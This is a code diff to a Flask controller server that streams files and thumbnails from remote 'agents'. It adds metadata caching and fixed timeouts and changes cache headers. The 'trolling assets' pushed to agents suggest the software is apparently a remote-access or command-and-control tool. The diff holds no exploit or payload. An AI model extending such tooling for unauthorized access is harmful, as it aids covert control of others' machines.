@@ -2517,6 +2517,25 @@ AGENT_FEATURE_FLAGS = defaultdict(lambda: dict(FEATURE_FLAGS_DEFAULT))
 
 MIN_STREAM_CHUNK = 256 * 1024
 MAX_STREAM_CHUNK = 8 * 1024 * 1024
+FILE_METADATA_CACHE = {}
+FILE_METADATA_CACHE_LOCK = threading.Lock()
+CACHE_TTL = 300
+
+def get_cached_metadata(agent_id: str, file_path: str):
+    key = f"{agent_id}:{file_path}"
+    with FILE_METADATA_CACHE_LOCK:
+        entry = FILE_METADATA_CACHE.get(key)
+        if entry and (time.time() - entry['timestamp']) < CACHE_TTL:
+            return entry['data']
+    return None
+
+def set_cached_metadata(agent_id: str, file_path: str, data: dict):
+    key = f"{agent_id}:{file_path}"
+    with FILE_METADATA_CACHE_LOCK:
+        FILE_METADATA_CACHE[key] = {
+            'data': data,
+            'timestamp': time.time()
+        }
 
 # Controller-hosted trolling assets (operator uploads -> agent fetch via signed URL)
 TROLL_UPLOADS = {}
@@ -3283,6 +3302,10 @@ def _guess_mime(path: str):
     return 'application/octet-stream'
 
 def _request_agent_file_range(agent_id: str, agent_sid: str, file_path: str, start: Optional[int], end: Optional[int], timeout_s: float = 30.0):
+    if start == 0 and end == 0:
+        cached = get_cached_metadata(agent_id, file_path)
+        if cached:
+            return cached
     request_id = f"range_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
     ev = threading.Event()
     with FILE_WAITERS_LOCK:
@@ -3299,7 +3322,10 @@ def _request_agent_file_range(agent_id: str, agent_sid: str, file_path: str, sta
         waiter = FILE_RANGE_WAITERS.pop(request_id, None)
     if not waiter:
         return None
-    return waiter.get('data')
+    result = waiter.get('data')
+    if result and start == 0 and end == 0 and not result.get('error'):
+        set_cached_metadata(agent_id, file_path, result)
+    return result
 
 def _request_agent_thumbnail(agent_id: str, agent_sid: str, file_path: str, size: int, timeout_s: float = 20.0):
     request_id = f"thumb_{int(time.time() * 1000)}_{secrets.token_hex(6)}"
@@ -3445,6 +3471,8 @@ def stream_agent_file(agent_id):
 
     mime = _guess_mime(file_path)
     range_header = request.headers.get('Range')
+    timeout_s = 10.0
+    initial_chunk_size = 256 * 1024
 
     if range_header:
         m = _RANGE_RE.match(range_header.strip())
@@ -3455,9 +3483,9 @@ def stream_agent_file(agent_id):
         end = int(end_s) if end_s != '' else None
 
         if start is None and end is not None:
-            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0)
+            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
             if not meta or meta.get('error'):
-                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 404
+                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
             total_size = int(meta.get('total_size') or 0)
             suffix_len = end
             if total_size <= 0 or suffix_len <= 0:
@@ -3465,26 +3493,21 @@ def stream_agent_file(agent_id):
             start = max(0, total_size - suffix_len)
             end = total_size - 1
         elif end is None:
-            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0)
+            meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
             if not meta or meta.get('error'):
-                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 404
+                return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
             total_size = int(meta.get('total_size') or 0)
             if total_size <= 0:
                 return Response(status=416)
-            chunk_len = _get_stream_chunk_size(agent_id)
+            chunk_len = initial_chunk_size
             s = int(start or 0)
             e = min(s + chunk_len - 1, total_size - 1)
             start = s
             end = e
-
-        _t0 = time.time()
-        data = _request_agent_file_range(agent_id, agent_sid, file_path, start, end if end is not None else -1)
-        _elapsed = time.time() - _t0
+        data = _request_agent_file_range(agent_id, agent_sid, file_path, start, end if end is not None else -1, timeout_s)
         if not data:
-            _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
             return jsonify({'error': 'Timeout'}), 504
         if data.get('error'):
-            _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
             return jsonify({'error': data.get('error')}), 404
 
         total_size = int(data.get('total_size') or 0)
@@ -3507,28 +3530,23 @@ def stream_agent_file(agent_id):
         if total_size > 0:
             resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
         resp.headers['Content-Disposition'] = 'inline'
-        resp.headers['Cache-Control'] = 'private, max-age=30'
+        resp.headers['Cache-Control'] = 'private, max-age=3600'
         resp.headers['X-Accel-Buffering'] = 'no'
-        _adjust_stream_chunk_size(agent_id, _elapsed, success=True)
         return resp
 
     # No Range header: serve initial chunk as partial content for progressive playback
-    meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0)
+    meta = _request_agent_file_range(agent_id, agent_sid, file_path, 0, 0, timeout_s)
     if not meta or meta.get('error'):
         return jsonify({'error': meta.get('error') if meta else 'Timeout'}), 504
     total_size = int(meta.get('total_size') or 0)
     if total_size <= 0:
         return jsonify({'error': 'Empty file'}), 404
-    chunk_len = _get_stream_chunk_size(agent_id)
+    chunk_len = initial_chunk_size
     end = min(chunk_len - 1, total_size - 1)
-    _t0 = time.time()
-    data = _request_agent_file_range(agent_id, agent_sid, file_path, 0, end)
-    _elapsed = time.time() - _t0
+    data = _request_agent_file_range(agent_id, agent_sid, file_path, 0, end, timeout_s)
     if not data:
-        _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
         return jsonify({'error': 'Timeout'}), 504
     if data.get('error'):
-        _adjust_stream_chunk_size(agent_id, _elapsed, success=False)
         return jsonify({'error': data.get('error')}), 404
     b64 = _extract_b64(data.get('data') or data.get('chunk'))
     if not b64:
@@ -3544,9 +3562,8 @@ def stream_agent_file(agent_id):
     resp.headers['Content-Length'] = str(len(raw))
     resp.headers['Content-Range'] = f'bytes {actual_start}-{actual_end}/{total_size}'
     resp.headers['Content-Disposition'] = 'inline'
-    resp.headers['Cache-Control'] = 'private, max-age=30'
+    resp.headers['Cache-Control'] = 'private, max-age=3600'
     resp.headers['X-Accel-Buffering'] = 'no'
-    _adjust_stream_chunk_size(agent_id, _elapsed, success=True)
     return resp
 
 @app.route('/api/agents/<agent_id>/files/stream_faststart', methods=['GET'])
@@ -3698,12 +3715,13 @@ def thumbnail_agent_file(agent_id):
         return jsonify({'error': 'File path is required'}), 400
 
     try:
-        size = int(request.args.get('size', '256'))
+        size = int(request.args.get('size', '128'))
     except Exception:
-        size = 256
-    size = max(16, min(size, 512))
+        size = 128
+    size = max(16, min(size, 256))
 
-    data = _request_agent_thumbnail(agent_id, agent_sid, file_path, size)
+    timeout_s = 5.0
+    data = _request_agent_thumbnail(agent_id, agent_sid, file_path, size, timeout_s)
     if not data:
         return jsonify({'error': 'Timeout'}), 504
     if data.get('error'):
@@ -3719,7 +3737,7 @@ def thumbnail_agent_file(agent_id):
         return jsonify({'error': 'Invalid data'}), 502
 
     resp = Response(raw, status=200, mimetype=mime)
-    resp.headers['Cache-Control'] = 'private, max-age=3600'
+    resp.headers['Cache-Control'] = 'public, max-age=7200, immutable'
     resp.headers['Content-Length'] = str(len(raw))
     resp.headers['Content-Disposition'] = 'inline'
     return resp
